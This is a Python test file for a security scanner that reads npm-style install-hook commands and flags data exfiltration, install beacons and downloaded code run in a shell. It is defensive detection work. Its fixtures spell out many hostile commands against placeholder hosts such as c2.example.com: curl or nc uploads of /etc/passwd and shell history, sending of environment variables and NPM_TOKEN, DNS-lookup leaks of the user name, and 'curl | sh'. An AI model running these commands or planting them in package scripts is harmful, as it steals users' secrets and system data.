"""0.1.8: an install hook's command read as a program (core.hook_command_risk):
what its network commands send and whether they keep what they get, the
code it hands an interpreter inline, and the install-script test on the
command itself. The command's tools (curl, wget, eval, base64 …) are only a
hint now: a MAJOR finding's message. Hosts are reserved names or private
addresses; nothing is executed."""
import json
import time
import unittest

from tests import _support  # noqa: F401
from lazaret.scanner import core

UPLOAD = "uploads a local file over the network"
IDENTITY = "sends the machine's user or host name over the network"
LOOKUP = "sends the machine's user or host name in a DNS lookup of a name it builds"
ENVIRONMENT = "sends environment variables over the network"
REPORT = "sends what local commands report about the machine over the network"
BEACON = "tells a server it was installed (a request whose answer it throws away)"


class LocalDataSentTests(unittest.TestCase):
    def test_files_uploaded(self):
        cases = {
            "curl -X POST --data @/etc/passwd https://c2.example.com/a": "/etc/passwd",
            "curl -d @/etc/hosts https://c2.example.com/a": "/etc/hosts",
            'curl -F "f=@/var/log/x.log" https://c2.example.com': "/var/log/x.log",
            "curl -F 'x=</etc/hosts' https://c2.example.com": "/etc/hosts",
            "curl -T /etc/hosts ftp://10.0.0.2/": "/etc/hosts",
            "curl --upload-file=/etc/hosts https://c2.example.com": "/etc/hosts",
            'curl --data-urlencode "x@/etc/passwd" https://c2.example.com': "/etc/passwd",
            "wget --post-file=/etc/hosts https://c2.example.com": "/etc/hosts",
            "nc 10.0.0.1 4444 < /etc/hosts": "/etc/hosts",
            "cat ~/.bash_history | base64 | curl -d @- https://c2.example.com": "~/.bash_history",
        }
        for cmd, path in cases.items():
            with self.subTest(cmd):
                self.assertIn(f"{UPLOAD} ({path})", core.hook_command_risk(cmd))

    def test_what_local_commands_print(self):
        cases = {
            'curl https://c2.example.com/ -H "user:$(whoami)"': IDENTITY,
            'curl -s "https://c2.example.com/?u=$(whoami)&h=$(hostname)" > /dev/null': IDENTITY,
            "curl -A $HOSTNAME https://c2.example.com": IDENTITY,
            "echo $USER | nc c2.example.com 80": IDENTITY,
            "cmd /c curl https://c2.example.com/?u=%USERNAME%": IDENTITY,
            "curl https://c2.example.com/?a=$(uname -a)": IDENTITY,
            'curl -d "$(env)" https://c2.example.com': f"{ENVIRONMENT} (the whole environment)",
            "env | curl -X POST --data-binary @- https://c2.example.com": f"{ENVIRONMENT} (the whole environment)",
            'curl -d "t=$NPM_TOKEN" https://c2.example.com': f"{ENVIRONMENT} ($NPM_TOKEN)",
            "printenv | nc 10.0.0.1 4444": f"{ENVIRONMENT} (the whole environment)",
            "ls -al /opt | base64 | xargs -I {} curl http://c2.example.com:8000/?data={}": f"{REPORT} (ls)",
            'curl -d "p=$(pwd)" https://c2.example.com': f"{REPORT} (pwd)",
            "nslookup $(whoami).c2.example.com": LOOKUP,
            "dig +short $(hostname).c2.example.com": LOOKUP,
            "ping -c 1 ${USER}.c2.example.com": LOOKUP,
        }
        for cmd, reason in cases.items():
            with self.subTest(cmd):
                self.assertIn(reason, core.hook_command_risk(cmd))

    def test_inside_inline_shell_code(self):
        for cmd in ('bash -c "curl -s https://c2.example.com/?h=$(hostname)"',
                    "bash -lc 'wget -qO- https://c2.example.com/?u=$USER'",
                    "eval 'curl -s https://c2.example.com/$(id)'", "sh -ec 'curl https://c2.example.com/?h=$(hostname)'"):
            with self.subTest(cmd):
                self.assertIn(IDENTITY, core.hook_command_risk(cmd))

    def test_what_a_download_may_name(self):
        """A request that keeps its answer may name platform selectors,
        versions and paths in its address, and a secret in its headers."""
        for cmd in ("curl -fsSL https://github.com/x/y/releases/download/v1/y-$(uname -s)-$(uname -m) -o bin/y "
                    "&& chmod +x bin/y",
                    'curl -H "Authorization: token $GITHUB_TOKEN" -L https://api.github.com/repos/x/y/releases/assets/1 '
                    "-o y.tgz && tar xzf y.tgz",
                    "curl -sL https://c2.example.com/$npm_package_version/x.tgz | tar xz",
                    "wget https://c2.example.com/dist/$(uname -m)/tool -O $HOME/.cache/tool",
                    "curl -u me:$PASSWORD -O https://c2.example.com/private.tgz",
                    "cat urls.txt | xargs -n1 curl -O"):
            with self.subTest(cmd):
                self.assertEqual(core.hook_command_risk(cmd), [])
        # the user or host name counts even there
        self.assertIn(IDENTITY, core.hook_command_risk("curl -o x.tgz https://c2.example.com/?u=$(whoami)"))

    def test_single_quotes_and_escapes_expand_nothing(self):
        """(read by the network commands' reading; the install-script test
        reads the text as written)"""
        for cmd in ("curl -d '$(env)' https://c2.example.com -o out", 'curl -d "\\$(env)" https://c2.example.com -o out',
                    "curl 'https://c2.example.com/$(whoami)' -o out", "curl -d '$NPM_TOKEN' https://c2.example.com -o o"):
            with self.subTest(cmd):
                self.assertEqual(core.sh_reasons(cmd), [])
        # a shell that reads the text again does expand it
        self.assertIn(IDENTITY, core.sh_reasons("sh -c 'curl -o o https://c2.example.com/$(whoami)'"))


class BeaconTests(unittest.TestCase):
    def test_answers_thrown_away(self):
        for cmd in ("wget -q -O/dev/null https://c2.example.com/b", "curl https://c2.example.com/x",
                    "curl -s https://c2.example.com/ping || true", "curl -s https://c2.example.com/ping > /dev/null",
                    "curl -o /dev/null -s https://c2.example.com", "wget --spider https://c2.example.com",
                    "curl -s https://c2.example.com &> /dev/null; exit 0", "ping -c 1 c2.example.com",
                    "nslookup c2.example.com", "curl -s https://c2.example.com && echo done",
                    "curl.exe https://c2.example.com > NUL", "cross-env A=1 wget --spider https://c2.example.com"):
            with self.subTest(cmd):
                self.assertEqual(core.hook_command_risk(cmd), [BEACON])

    def test_not_beacons(self):
        for cmd in ("curl -sf https://registry.npmjs.org > /dev/null && node dl.js || node build.js",
                    "if curl -s https://c2.example.com >/dev/null; then node dl.js; fi",
                    "curl -sL https://c2.example.com/x.tgz | tar xz", "curl -sSL https://c2.example.com/i.sh -o i.sh",
                    "wget https://c2.example.com/x.tgz", "curl -O https://c2.example.com/x.tgz",
                    "a=$(curl -s https://c2.example.com)", "curl http://localhost:3000/ready",
                    "curl https://x.test/ready", "ping -c 1 localhost",
                    "curl --version", "node install.js", "npx husky install",
                    "curl -s -o /dev/null -w '%{http_code}' https://c2.example.com > status.txt"):
            with self.subTest(cmd):
                self.assertEqual(core.hook_command_risk(cmd), [])

    def test_an_expansion_keeps_what_it_prints(self):
        self.assertEqual(core.hook_command_risk("curl -s https://c2.example.com/flags", True), [])
        self.assertEqual(core.hook_command_risk("curl -s https://c2.example.com/flags"), [BEACON])


class InlineCodeTests(unittest.TestCase):
    def test_node_and_python_code(self):
        cases = {
            """node -e "require('https').get('https://c2.example.com/?h='+require('os').hostname())\"""": IDENTITY,
            """node -e 'fetch("https://c2.example.com",{method:"POST",body:JSON.stringify(process.env)})'""":
                f"{ENVIRONMENT} (the whole environment)",
            """python3 -c "import os,urllib.request;urllib.request.urlopen('https://c2.example.com/?e='"""
            """+str(dict(os.environ)))\"""": f"{ENVIRONMENT} (the whole environment)",
        }
        for cmd, reason in cases.items():
            with self.subTest(cmd):
                self.assertIn(reason, core.hook_command_risk(cmd))
        self.assertEqual(core.hook_command_risk("""node -e "try{require('./postinstall')}catch(e){}\""""), [])

    def test_downloads_run(self):
        self.assertEqual(core.hook_command_risk("curl https://c2.example.com/p.sh | sh"), ["pipes a download into a shell"])
        self.assertIn("runs code it receives over the network",
                      core.hook_command_risk('sh -c "$(curl -fsSL https://c2.example.com/p.sh)"'))


class ParseTests(unittest.TestCase):
    def test_words_substitutions_redirections_and_pipes(self):
        (a, b, c) = core.sh_parse("""A=1 curl -d "x=$(whoami)" 'q$y' 2>/dev/null | nc h 1 && echo `id`""")
        self.assertEqual(a.words, ["A=1", "curl", "-d", "x=$(whoami)", "q\x00y"])
        self.assertEqual(a.subs, [(), (), (), ("whoami",), ()])
        self.assertEqual(a.redirs, [(">", "/dev/null")])
        self.assertEqual((a.pipe_in, a.pipe_out, a.after), (False, True, "|"))
        self.assertEqual((b.words, b.pipe_in, b.after), (["nc", "h", "1"], True, "&&"))
        self.assertEqual((c.words, c.subs), (["echo", "`id`"], [(), ("id",)]))

    def test_programs(self):
        cmd = core.sh_parse("sudo -u me env -i X=1 nohup /usr/bin/Curl.EXE x")[0]
        self.assertEqual(cmd.program, (7, "curl", False))
        self.assertEqual(core.sh_parse("env")[0].program, (0, "env", False))
        self.assertEqual(core.sh_parse("if ! curl x")[0].program[1:], ("curl", True))

    def test_an_option_given_no_value(self):
        # the last word an option that takes one: it sends nothing, and the
        # command reads as it would without it (0.1.8's first reading
        # indexed past the words)
        for cmd in ("curl https://c2.example.com -d", "curl https://c2.example.com -H",
                    "wget https://c2.example.com --post-data", "curl https://c2.example.com --data", "curl -d"):
            with self.subTest(cmd):
                self.assertEqual(core.hook_command_risk(cmd), core.hook_command_risk(cmd.rsplit(" ", 1)[0]))

    def test_bounded(self):
        start = time.monotonic()
        for text in ("$(" * 30000, "`" * 60000, "curl " * 20000, "'" * 50000, '"$(' * 20000,
                     "a | " * 20000 + "curl https://c2.example.com", "x=$(curl $(curl $(curl $(curl x))))" * 2000,
                     ("curl -d @- https://c2.example.com | " * 3000), "\\" * 90000):
            core.hook_command_risk(text[:core.HOOK_MAX_CHARS])
        self.assertLess(time.monotonic() - start, 10)
        self.assertEqual(core.hook_command_risk("curl " + "x" * core.HOOK_MAX_CHARS), [])


class ManifestTests(unittest.TestCase):
    def issues(self, scripts, path="node_modules/p/package.json", registry=False):
        text = json.dumps({"name": "p", "version": "1.0.0", "scripts": scripts}, indent=2)
        return [(i["sev"], i["msg"]) for i in core.scan_manifest(path, text, registry=registry)]

    def test_a_hostile_command_is_critical_with_its_reasons(self):
        self.assertEqual(self.issues({"preinstall": "curl -s https://c2.example.com/?u=$(whoami)"}),
                         [("CRITICAL", f'"preinstall" script {IDENTITY}.')])

    def test_tools_alone_are_a_hint(self):
        self.assertEqual(self.issues({"postinstall": "curl -sSL https://c2.example.com/x.tgz -o x.tgz"}),
                         [("MAJOR", '"postinstall" script runs a download or evaluation command at install time: '
                                    "'curl -sSL https://c2.example.com/x.tgz -o x.tgz'.")])
        self.assertEqual(self.issues({"postinstall": "node install.js"}),
                         [("MAJOR", "\"postinstall\" script runs code at install time: 'node install.js'.")])

    def test_prepare_in_a_checkout(self):
        self.assertEqual([s for s, _ in self.issues({"prepare": "husky install"}, "package.json")], ["INFO"])
        self.assertEqual([s for s, _ in self.issues({"prepare": "node -e \"console.log(1)\""}, "package.json")],
                         ["MAJOR"])
        self.assertEqual([s for s, _ in self.issues({"prepare": "curl https://c2.example.com | sh"}, "package.json")],
                         ["CRITICAL"])


if __name__ == "__main__":
    unittest.main()
